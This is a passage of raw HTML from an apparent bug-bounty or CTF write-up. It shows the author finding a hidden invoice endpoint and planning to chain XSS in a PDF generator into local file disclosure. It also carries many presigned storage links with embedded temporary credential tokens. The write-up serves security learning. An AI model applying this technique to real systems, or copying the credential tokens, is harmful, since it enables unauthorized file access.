data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/515/a0af415e6ef0c5377aec97d2ea3ed3447930fce0/Selection_210.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_210.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_210.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061021Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026amp;X-Amz-Signature=65ad3a43694ea8203bbeeaea406c76b09a610f1cdd1cd20f10a2ebe65c73ba4f\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/515/a0af415e6ef0c5377aec97d2ea3ed3447930fce0/Selection_210.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_210.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_210.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061021Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026amp;X-Amz-Signature=65ad3a43694ea8203bbeeaea406c76b09a610f1cdd1cd20f10a2ebe65c73ba4f\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eFrom the UI, we can see an invoices and reports page. But they\u0026#39;re both login protected\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Selection_211.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/519/27aea19812407d5d9ca7e666c67b5d4068159834/Selection_211.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_211.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_211.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061021Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026amp;X-Amz-Signature=9e4a1aeea6f9bc5b91d06910ff8830843654794ae8fd342d060fc1db2cbe2a8d\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/519/27aea19812407d5d9ca7e666c67b5d4068159834/Selection_211.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_211.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_211.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061021Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026amp;X-Amz-Signature=9e4a1aeea6f9bc5b91d06910ff8830843654794ae8fd342d060fc1db2cbe2a8d\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eInstead of playing around with the login, I decided to concentrate on a commented endpoint I found in the HTML source of invoices.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\n                    \u003cspan class=\"nt\"\u003e\u0026lt;li\u003c/span\u003e  \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;nav-item\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n                        \u003cspan class=\"nt\"\u003e\u0026lt;a\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;nav-link\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;/\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eHome\u003cspan class=\"nt\"\u003e\u0026lt;/a\u0026gt;\u003c/span\u003e\n                    \u003cspan class=\"nt\"\u003e\u0026lt;/li\u0026gt;\u003c/span\u003e\n                    \u003cspan class=\"nt\"\u003e\u0026lt;li\u003c/span\u003e  \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;nav-item\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n                        \u003cspan class=\"nt\"\u003e\u0026lt;a\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;nav-link\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;/reports\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eReports\u003cspan class=\"nt\"\u003e\u0026lt;/a\u0026gt;\u003c/span\u003e\n                    \u003cspan class=\"nt\"\u003e\u0026lt;/li\u0026gt;\u003c/span\u003e\n                    \u003cspan class=\"nt\"\u003e\u0026lt;li\u003c/span\u003e  \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;nav-item active\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n                        \u003cspan class=\"nt\"\u003e\u0026lt;a\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;nav-link\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;/invoices\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eInvoices\u003cspan class=\"nt\"\u003e\u0026lt;/a\u0026gt;\u003c/span\u003e\n                    \u003cspan class=\"nt\"\u003e\u0026lt;/li\u0026gt;\u003c/span\u003e\n\n                    \u003cspan class=\"c\"\u003e\u0026lt;!--\u0026lt;li  class=\u0026quot;nav-item\u0026quot; \u0026gt;\n                        \u0026lt;a class=\u0026quot;nav-link\u0026quot; href=\u0026quot;/invoices/new\u0026quot;\u0026gt;New Invoice\u0026lt;/a\u0026gt;\n                    \u0026lt;/li\u0026gt;--\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe \u003ccode\u003e/invoices/new\u003c/code\u003e looked pretty interesting....\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Selection_212.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/520/7449ad9f3ac7bc545926b58444112feef9201b99/Selection_212.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_212.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_212.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061021Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026amp;X-Amz-Signature=45ae2ee9aced64efd57be3c51928d83bcb00e5f0e26ed32f16b7c458010000a9\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/520/7449ad9f3ac7bc545926b58444112feef9201b99/Selection_212.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_212.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_212.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061021Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026amp;X-Amz-Signature=45ae2ee9aced64efd57be3c51928d83bcb00e5f0e26ed32f16b7c458010000a9\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eSo we have a \u0026quot;preview\u0026quot; and a \u0026quot;Save PDF\u0026quot; feature. Capturing the request in Burp, we observe JSON being sent as a GET parameter\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Selection_213.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/521/c94c9cc88f044eee89695e5ae8ec7bf668f3e882/Selection_213.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_213.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_213.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061021Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026amp;X-Amz-Signature=e9001cfd2cea427151498893c744ca1b2be068afc4e335a1d1200bf509b2a0b8\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/521/c94c9cc88f044eee89695e5ae8ec7bf668f3e882/Selection_213.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_213.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_213.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061021Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026amp;X-Amz-Signature=e9001cfd2cea427151498893c744ca1b2be068afc4e335a1d1200bf509b2a0b8\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThe preview endpoint generates a HTML page based on our input and the Save PDF endpoint probably uses that HTML and parses it into a PDF. \u003c/p\u003e\n\n\u003cp\u003eSeems to me that we need to get XSS and somehow get the PDF renderer to parse our arbitrary HTML/Javascript. Then, we might be able to leverage it into an LFD by using iframes etc.\u003c/p\u003e\n\n\u003cp\u003ePlaying around with it a little, we quickly identify the unsanitized input in the \u0026quot;body\u0026quot; key of the JSON. \u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Selection_214.png\" 